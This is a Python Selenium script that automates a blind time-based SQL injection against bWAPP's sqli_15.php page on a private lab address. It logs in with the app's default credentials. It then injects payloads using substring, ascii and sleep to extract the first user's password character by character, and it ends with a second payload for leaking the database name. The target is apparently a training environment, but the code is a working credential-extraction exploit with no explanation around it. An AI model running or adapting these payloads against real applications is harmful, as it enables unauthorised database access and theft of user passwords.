import time
from urllib import parse
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
truekeyword='''be sent by e-mail'''
url='''http://192.168.246.130/bWAPP/sqli_15.php'''
loginurl='''http://192.168.246.130/bWAPP/login.php'''
baseurl='''http://192.168.246.130/bWAPP/portal.php'''
data = {'login': 'bee', 'password': 'bug'}
from selenium import webdriver
browser=webdriver.Chrome('chromedriver.exe')
browser.get(loginurl)
browser.find_element_by_name('login').send_keys('bee')
browser.find_element_by_name('password').send_keys('bug')
browser.find_element_by_name('form').click()
browser.get(url)
answer=''
for i in range(40):
    for j in range(48,128):
        browser.get(baseurl)
        start=time.time()
        passwordpattern='''' or 1=1 and ascii(substring((select password from users limit 0,1),'''+str(i+1)+''',1))='''+str(j)+''' and sleep(1)#'''
        arg=parse.quote(passwordpattern)
        browser.get(url+'?title='+arg+'&action=search')
        wait = WebDriverWait(browser, 100)
        element = wait.until(expected_conditions.element_to_be_clickable((By.NAME, 'action')))
        flag=browser.find_element_by_xpath('''//*[@id="main"]''').text
        if(truekeyword in flag):
            end=time.time()
            if(end-start>5):
                answer+=chr(j)
                print(answer)
                break
print(answer)

dbnamepattern = '''' or 1=1 and ascii(substring(database(),''' + str(i + 1) + ''',1))=''' + str(j) + '''#'''
